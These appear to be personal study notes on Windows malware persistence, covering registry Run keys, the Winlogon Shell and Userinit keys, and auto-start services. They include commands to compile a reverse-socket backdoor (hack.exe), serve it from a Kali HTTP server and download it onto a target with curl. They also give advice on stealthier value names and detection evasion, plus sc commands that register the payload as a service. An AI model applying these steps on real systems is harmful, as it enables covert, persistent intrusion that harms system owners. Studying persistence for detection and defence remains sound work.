MALWARE PERSISTENCE MECHANISMS
- Allows malware to resume operation even after restarts, logoffs, reboots, e.t.c
- CHECK: Autostart
1. Classic path: registry Run keys
2. Leveraging registry keys utilized by Winlogon process
3. Implementing DLL search order hijacking for PERSISTENCE
4. Hunting for PERSISTENCE: exploring non-trivial loopholes
5. ID new PERSISTENCE tricks


Classic Path: Registry Run keys
- Involves including an entry within the "Run Keys" file located in the registry will
result in automatic execution of the code upon a user's login.
- BY default, windows Systems generate:
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Threat actors have the capability to take advantage of those mentioned
configs to run malware, ensuring PERSISTENCE.
PROJECT
hack.cpp => contains code to our backdoor
pers.c => Is responsible to generating registry keys that trigger the execution of our malicious Software, hack.exe upon logging into the windows OS
----> Additional pers.c:
    // Note: In a real malware scenario, you might want to:
    // 1. Add error handling for failed registry operations
    // 2. Copy the executable to a more permanent location
    // 3. Use a less suspicious value name than "hack"
    // 4. Implement stealth techniques to avoid detection


Leveraging Registry Keys Utilized by Winlogon process
- Winlogon process assumes the responsibility of fascilitating user logon and logoff ops,
managing system starting and shutdown procedure as well as Implementing screen locking
functionality.
- Modify registry entries for Winlogon process in order to establish PERSISTENCE
- To apply this persistence: modify the following keys:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
 Winlogon\Shell
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
 Winlogon\Userinit

Develop a harmful application: hack.cpp  (reverse backdoor using sockets)
Compile into:  
    kali> x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
----> deploy hack.exe on the target
    kali> python -m http.server 9000
Target CMD----> cmd> curl -o hack.exe 192.168.1.112/hack.exe

Modifications made to the Shell Registry will incorparate a malicious application, 
will lead to the activation of explorer.exe and hack.exe upon windows logon.
- SCRIPT: perc_logon.c




Exploring Windows Services for PERSISTENCE
- Roles played by windows Services play in Hacking:
1. Services API functions seamlessly over network connections, allowing
the efficient operation with remote Services
2. The process initiate automatically upon system initialization.
3. They may have extremely elevated rights within the OS
- Incorrect configurations of Services might potentially result in
priviledge escalation or serve as a means of persistence.
- Requires admin credentials
win_service.cpp  / meowsrc.cpp
compile:
kali> x86_64-w64-mingw32-g++ -O2 meowsrv.c -o meowsrv.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ladvapi32
On the cmd:
NOTE: Persistence works on reboots but fails on restart. Works when user restarts
# Create the service
sc create MeowService binPath= "C:\test\meowsrv.exe" start= auto

# Start the service
sc start MeowService

# Verify service is running
sc query MeowService




